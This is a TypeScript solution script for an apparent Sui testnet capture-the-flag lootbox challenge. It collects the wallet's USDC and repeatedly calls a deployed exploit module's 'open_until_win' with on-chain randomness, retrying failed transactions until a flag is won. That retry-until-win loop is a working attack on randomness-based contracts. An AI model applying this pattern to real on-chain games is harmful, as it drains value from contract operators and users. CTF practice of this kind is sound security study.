import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from '../keypair.json' with { type: 'json' };

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
	network: 'testnet',
	baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const CTF_PACKAGE_ID = '0xd56e5075ba297f9e37085a37bb0abba69fabdf9987f8f4a6086a3693d88efbfd';
const EXPLOIT_PACKAGE_ID =
	'0x92517d3e29530e3e0d09f2ed452adfd7ba01323b670551a3b198199644cd7c7d';

// 15 USDC (6 decimals) per lootbox
const REQUIRED_PAYMENT = 15_000_000n;

// This is the USDC package from your publish output dependencies.
const USDC_TYPE =
	'0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29::usdc::USDC';
const USDC_COIN_TYPE = `0x2::coin::Coin<${USDC_TYPE}>`;

async function getAllUsdcCoins(owner: string): Promise<{ objectId: string; balance: string }[]> {
	const coins: { objectId: string; balance: string }[] = [];
	let cursor: string | null = null;

	try {
		const listResult = await suiClient.listCoins({
			owner,
			coinType: USDC_COIN_TYPE,
			limit: 50,
			cursor,
		});

		for (const c of listResult.objects) {
			coins.push({ objectId: c.objectId, balance: c.balance });
		}

		cursor = listResult.hasNextPage ? listResult.cursor : null;
		while (cursor) {
			const next = await suiClient.listCoins({
				owner,
				coinType: USDC_COIN_TYPE,
				limit: 50,
				cursor,
			});

			for (const c of next.objects) {
				coins.push({ objectId: c.objectId, balance: c.balance });
			}
			cursor = next.hasNextPage ? next.cursor : null;
		}
	} catch {
		// fall through to owned objects fallback
	}

	// Fallback 1: exact type via owned objects
	if (coins.length === 0) {
		let objCursor: string | null = null;
		do {
			const res = await suiClient.listOwnedObjects({
				owner,
				type: USDC_COIN_TYPE,
				limit: 50,
				cursor: objCursor,
				include: { json: true },
			});

			for (const obj of res.objects) {
				let balance = '0';
				if (obj.json && typeof obj.json === 'object') {
					const j = obj.json as Record<string, unknown>;
					if (typeof j.balance === 'string') {
						balance = j.balance;
					} else if (
						j.balance &&
						typeof j.balance === 'object' &&
						'value' in (j.balance as object)
					) {
						balance = String((j.balance as { value: string }).value);
					}
				}
				coins.push({ objectId: obj.objectId, balance });
			}

			objCursor = res.hasNextPage ? res.cursor : null;
		} while (objCursor);
	}

	// Fallback 2: loose scan for anything coin-like containing usdc
	if (coins.length === 0) {
		let objCursor: string | null = null;
		do {
			const res = await suiClient.listOwnedObjects({
				owner,
				limit: 50,
				cursor: objCursor,
				include: { json: true },
			});

			for (const obj of res.objects) {
				const t = (obj.type || '').toLowerCase();
				if (!t.includes('usdc') || !t.includes('coin')) continue;

				let balance = '0';
				if (obj.json && typeof obj.json === 'object') {
					const j = obj.json as Record<string, unknown>;
					if (typeof j.balance === 'string') {
						balance = j.balance;
					} else if (
						j.balance &&
						typeof j.balance === 'object' &&
						'value' in (j.balance as object)
					) {
						balance = String((j.balance as { value: string }).value);
					}
				}
				coins.push({ objectId: obj.objectId, balance });
			}

			objCursor = res.hasNextPage ? res.cursor : null;
		} while (objCursor);
	}

	return coins;
}

function sleep(ms: number): Promise<void> {
	return new Promise((resolve) => setTimeout(resolve, ms));
}

(async () => {
	const address = keypair.getPublicKey().toSuiAddress();
	const initialCoins = await getAllUsdcCoins(address);
	const totalBalance = initialCoins.reduce((sum, c) => sum + BigInt(c.balance), 0n);

	console.log('Address:', address);
	console.log('Exploit package:', EXPLOIT_PACKAGE_ID);
	console.log('USDC type:', USDC_TYPE);
	console.log('Total detected USDC balance:', totalBalance.toString());

	if (totalBalance < REQUIRED_PAYMENT) {
		throw new Error(
			`Insufficient USDC. Need ${REQUIRED_PAYMENT} (15 USDC), have ${totalBalance}.`
		);
	}

	let attempt = 0;

	while (true) {
		attempt++;
		console.log(`Attempt ${attempt}...`);

		const coins = await getAllUsdcCoins(address);
		const totalNow = coins.reduce((sum, c) => sum + BigInt(c.balance), 0n);

		if (totalNow < REQUIRED_PAYMENT) {
			throw new Error(`Ran out of USDC during attempts. Need ${REQUIRED_PAYMENT}, have ${totalNow}.`);
		}

		const tx = new Transaction();

		let paymentCoin: ReturnType<Transaction['object']>;
		const coinWithEnough = coins.find((c) => BigInt(c.balance) >= REQUIRED_PAYMENT);

		if (coinWithEnough) {
			if (BigInt(coinWithEnough.balance) === REQUIRED_PAYMENT) {
				paymentCoin = tx.object(coinWithEnough.objectId);
			} else {
				[paymentCoin] = tx.splitCoins(tx.object(coinWithEnough.objectId), [REQUIRED_PAYMENT]);
			}
		} else {
			const [head, ...rest] = coins;
			if (!head) {
				throw new Error('No USDC coin objects found.');
			}

			if (rest.length > 0) {
				tx.mergeCoins(
					tx.object(head.objectId),
					rest.map((c) => tx.object(c.objectId))
				);
			}
			[paymentCoin] = tx.splitCoins(tx.object(head.objectId), [REQUIRED_PAYMENT]);
		}

		// Random PTB restriction: keep the random-using call as the final command.
		tx.moveCall({
			target: `${EXPLOIT_PACKAGE_ID}::exploit::open_until_win`,
			arguments: [paymentCoin, tx.object.random()],
		});

		try {
			const result = await suiClient.signAndExecuteTransaction({
				transaction: tx,
				signer: keypair,
				include: { effects: true, events: true },
			});

			if (result.$kind === 'FailedTransaction') {
				console.log('  No flag this time, retrying...');
				await sleep(1200);
				continue;
			}

			const digest = result.Transaction.digest;
			console.log('Success! Digest:', digest);

			const effects = result.Transaction.effects;
			if (!effects?.changedObjects) {
				console.log('Transaction succeeded.');
				return;
			}

			const created = effects.changedObjects.filter(
				(o) =>
					o.idOperation === 'Created' &&
					o.outputOwner?.$kind === 'AddressOwner' &&
					o.outputOwner.AddressOwner === address
			);

			const flagId = created[0]?.objectId;
			if (flagId) {
				console.log('Flag object ID:', flagId);

				try {
					const { object } = await suiClient.getObject({
						objectId: flagId,
						include: { json: true },
					});

					if (object?.json && typeof object.json === 'object') {
						const data = object.json as Record<string, unknown>;
						if (data.source) console.log('Flag source:', data.source);
					}
				} catch {
					// ignore fetch/display errors
				}
			}

			console.log('Won after', attempt, 'attempt(s).');
			return;
		} catch (err) {
			console.warn('  Error:', err);
			await sleep(1500);
		}
	}
})();
